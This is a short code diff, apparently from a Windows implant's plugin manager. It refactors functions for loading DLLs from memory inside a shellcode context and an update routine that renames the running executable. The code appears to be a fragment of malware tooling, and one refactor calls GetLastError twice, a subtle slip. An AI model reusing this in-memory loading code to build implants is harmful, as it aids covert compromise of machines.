@@ -1,12 +1,9 @@
-#include <stdio.h>
-
 #include "PluginManager.h"
 #include "plugininterface.h"
 
 FARPROC WINAPI GPA_WRAPPER(HMODULE hModule, LPCTSTR lpProcName);
 
-bool WINAPI LoadLibraryFromMemory(SHELLCODE_CONTEXT* pSCC,
-                                   const void *data, LPCWSTR dllname, PMEMORYMODULE result);
+bool WINAPI LoadLibraryFromMemory(SHELLCODE_CONTEXT* pSCC,const void *data, LPCWSTR dllname, PMEMORYMODULE result);
 void WINAPI FreeLibraryFromMemory(SHELLCODE_CONTEXT* pSCC, PMEMORYMODULE module);
 
 //int __cdecl printf(const char*, ...);
@@ -61,7 +58,8 @@ bool PluginManager::updateServer(DArray& /*newServer*/){
     long FilenameSize;
     FilenameSize = GetModuleFileName(0,FileName,sizeof(FileName)-1);
 
-    strcpy(FileNameNew,FileName);
+	StringCchCopy(FileNameNew,1024,FileName);
+
     FileNameNew[FilenameSize] = '_';
     FileNameNew[FilenameSize+1] = 0;
 
@@ -69,9 +67,11 @@ bool PluginManager::updateServer(DArray& /*newServer*/){
 
     return true;
 }
+
 int exception(){
     return EXCEPTION_CONTINUE_SEARCH;
 }
+
 bool WINAPI LoadLibraryFromMemory(SHELLCODE_CONTEXT* pSCC,
                                    const void *data, LPCWSTR dllname, PMEMORYMODULE result){
     int status = 0;
@@ -150,9 +150,8 @@ bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
             }else{
                 DebufPrintf("[pm] getInterface not fund\n");
                 if(!getInterface){
-                    uint error = (uint)GetLastError();
-                    DebufPrintf("GetProcAddress error: %x(%s)\n",error,
-                           error==ERROR_PROC_NOT_FOUND?"PROC_NOT_FOUND":"");
+                    DebufPrintf("GetProcAddress error: %x(%s)\n",(uint)GetLastError(),
+                           (uint)GetLastError()==ERROR_PROC_NOT_FOUND?"PROC_NOT_FOUND":"");
                     FreeLibraryFromMemory(Context,&newPlugin->Module);
                 }
                 delete newPlugin;
